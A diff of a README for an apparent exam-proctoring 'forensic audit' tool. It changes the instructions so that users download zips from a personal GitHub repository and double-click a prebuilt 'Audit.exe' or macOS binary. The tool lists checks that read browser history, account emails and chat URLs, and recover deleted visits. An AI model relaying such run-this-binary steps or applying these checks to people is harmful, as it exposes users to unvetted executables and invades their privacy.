@@ -6,8 +6,8 @@ Official cross-platform proctoring forensic audit toolset for Windows and macOS.
 
 | Platform | Download Package | Quick Instructions |
 | :--- | :--- | :--- |
-| **Windows** | [📥 **Download `Audit_Windows.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip) | 1. Extract `Audit_Windows.zip`<br>2. Double-click `Run_Audit.bat`<br>3. Press **Enter** for default 2-hour audit |
-| **macOS** | [📥 **Download `Audit_Mac.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Mac.zip) | 1. Extract `Audit_Mac.zip`<br>2. Double-click `Audit.app` (or `Audit_Mac.command`)<br>3. Press **Enter** for default 2-hour audit |
+| **Windows** | [📥 **Download `Audit_Windows.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip) | 1. Extract `Audit_Windows.zip`<br>2. Double-click **`Audit.exe`**<br>3. Press **Enter** for default 2-hour audit |
+| **macOS** | [📥 **Download `Audit_Mac.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Mac.zip) | 1. Extract `Audit_Mac.zip`<br>2. Double-click **`Audit.app`** (or run `./Audit_Mac` in Terminal)<br>3. Press **Enter** for default 2-hour audit |
 
 ---
 
@@ -20,3 +20,4 @@ The tool performs local, read-only system forensic checks across 5 core complian
 3. **Live AI Windows Open Right Now**: Checks for active foreground AI solver windows (ChatGPT, Gemini, Claude, DeepSeek).
 4. **AI Website / Solver Visited**: Analyzes browser history timelines with exact timestamps, dwell time, user account email, and specific problem/chat URLs.
 5. **Browser History Wiped / Tampered**: Recovers deleted AI visits from the Omnibox shortcut cache.
+
